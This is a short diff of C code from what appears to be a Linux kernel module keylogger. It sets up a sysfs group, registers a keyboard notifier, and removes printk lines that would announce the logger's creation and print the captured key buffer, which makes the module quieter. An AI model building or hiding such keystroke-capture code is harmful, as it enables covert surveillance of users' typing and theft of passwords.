@@ -142,7 +142,6 @@ if (!keyLog_obj)
  * sysfs_creare_group --> kobject : keyLog_obj , struct attribute_group : attr_group */	
 err = sysfs_create_group(keyLog_obj, &attr_group);
 
-printk(KERN_INFO "keylog_init() : key_Logger Created successfully");
 /*Returns 0 on success*/
 if (err)
 	kobject_put(keyLog_obj);//decrement refcount for kobject. when refcount == 0 -> call Kobject_cleanup() through kobject_release()
@@ -164,7 +163,6 @@ printk(KERN_NOTICE "notifier block register to notification chains of keyboard\n
 memset(keys_buffer, 0, BUFFER_LEN);
 
 
-//printk(KERN_INFO "%s\n",keys_buffer);
 return 0;
 }
 
